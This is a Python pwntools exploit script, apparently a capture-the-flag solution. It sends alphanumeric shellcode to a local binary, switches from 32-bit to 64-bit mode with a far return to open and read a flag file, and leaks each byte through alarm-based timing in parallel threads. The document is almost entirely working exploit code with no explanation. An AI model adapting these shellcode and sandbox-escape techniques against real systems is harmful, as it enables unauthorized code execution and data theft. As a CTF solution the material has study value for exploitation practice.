from pwn import * 
import threading

cmd = '''
b * 0x00000000040026D
'''

def asm32(sc):
	return asm(sc, os = 'linux', arch='i386')

def asm64(sc):
	return asm(sc, os = 'linux', arch='amd64')

def exp1(reloc, ch):
	payload1 = b"Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00"
	
	# gdb.attach(cn, cmd)
	cn.sendline(payload1)
	# pause()

	openflag = asm32(shellcraft.i386.linux.open("./flag"))
	ret264 = asm32('''
		push 0x33; 
		push 0x40404065;
		// retfq;
		''') + b"H\xcb"
	readflag = asm64(shellcraft.amd64.linux.read(3, 'rsp', 0x100))

	if reloc == 0:
	    shellcode = "cmp byte ptr[rsp+{0}], {1}; jz $-4; ret".format(reloc, ch)
	else:
	    shellcode = "cmp byte ptr[rsp+{0}], {1}; jz $-5; ret".format(reloc, ch)
	check = asm(shellcode, arch='amd64', os='linux')

	sc2 = openflag + ret264 + readflag + check
	cn.sendline(sc2)

openflag = asm32(shellcraft.i386.linux.open("./flag"))
ret264 = asm32('''
	push 0x33; 
	push 0x40404065;
	// retfq;
	''') + b"H\xcb"
readflag = asm64(shellcraft.amd64.linux.read(3, 'rsp', 0x100))

def exp(idx):
	cn = process("./bin")
	payload1 = b"Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00"
	
	# gdb.attach(cn, cmd)
	cn.sendline(payload1)
	# pause()

	alarm = asm64('''
		xor rax, rax;
		mov al, byte ptr[rsp+{}];
		mov rdi, rax;
		sub rdi, 0x20;
		push 37;
		pop rax;
		syscall;
		jmp $;
		'''.format(idx))

	sc2 = openflag + ret264 + readflag + alarm
	start = time.time()
	cn.sendline(sc2)
	try:
		cn.recv()
	except:
		...
	end = time.time()
	cn.close()
	pass_time = int(end-start) + 0x20
	flag[idx] = pass_time
	print(bytes(flag))


context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw']

# cn = process("./bin")
# # exp(0, ord('t'))
# exp(0)
# cn.interactive()

# flag = []
# idx = 0
# while True:
# 	for ch in range(32, 127):
# 		cn = process("./bin")
# 		exp(idx, ch)
# 		start = time.time()
# 		try:
# 			cn.recv(timeout=2)
# 		except:
# 			...
# 		cn.close()
# 		end = time.time()
# 		if end - start > 1.5:
# 			flag.append(ch)
# 			print(bytes(flag))
# 			break;
# 	else:
# 		print(bytes(flag))
# 		break
# 	idx += 1

pool = []
flag = [0]*0x20
for i in range(0x20):
	t = threading.Thread(target=exp, args=(i, ))
	pool.append(t)
	t.start()
for i in pool:
	t.join()
print(bytes(flag))
